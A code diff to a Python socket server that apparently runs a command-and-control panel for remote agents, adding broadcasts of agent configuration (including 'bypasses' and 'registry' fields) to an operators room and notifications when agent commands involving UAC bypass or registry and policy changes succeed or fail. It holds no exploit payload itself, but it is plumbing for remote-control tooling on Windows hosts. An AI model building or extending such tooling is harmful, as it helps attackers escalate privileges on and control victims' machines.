@@ -4129,6 +4129,15 @@ def _emit_agent_config(agent_id: str):
             'registry': s.get('registry', {})
         }
         emit('config_update', payload, room=agent_sid)
+        try:
+            ops_payload = {
+                'agent': {'id': agent_id, **(payload.get('agent') or {})},
+                'bypasses': payload.get('bypasses') or {},
+                'registry': payload.get('registry') or {},
+            }
+            emit('config_update', ops_payload, room='operators', broadcast=True)
+        except Exception:
+            pass
     except Exception:
         pass
 
@@ -5603,6 +5612,34 @@ def handle_command_result(data):
                     "Command Failure",
                     f'Agent {AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}")} ({agent_id}) command "{command}" failed. Output: {safe_output[:500]}'
                 )
+        except Exception:
+            pass
+        try:
+            cmd = (command or '')
+            lc = cmd.lower()
+            notif_type = 'success' if success else 'error'
+            if ('uac' in lc) or ('bypass' in lc):
+                emit('agent_notification', {
+                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
+                    'type': notif_type,
+                    'title': 'UAC Bypass',
+                    'message': f'{cmd} {"succeeded" if success else "failed"}',
+                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                    'agent_id': agent_id,
+                    'read': False,
+                    'category': 'security'
+                }, room='operators', broadcast=True)
+            elif ('registry' in lc) or ('reg ' in lc) or ('policy' in lc):
+                emit('agent_notification', {
+                    'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
+                    'type': notif_type,
+                    'title': 'Registry Control',
+                    'message': f'{cmd} {"succeeded" if success else "failed"}',
+                    'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
+                    'agent_id': agent_id,
+                    'read': False,
+                    'category': 'security'
+                }, room='operators', broadcast=True)
         except Exception:
             pass
 
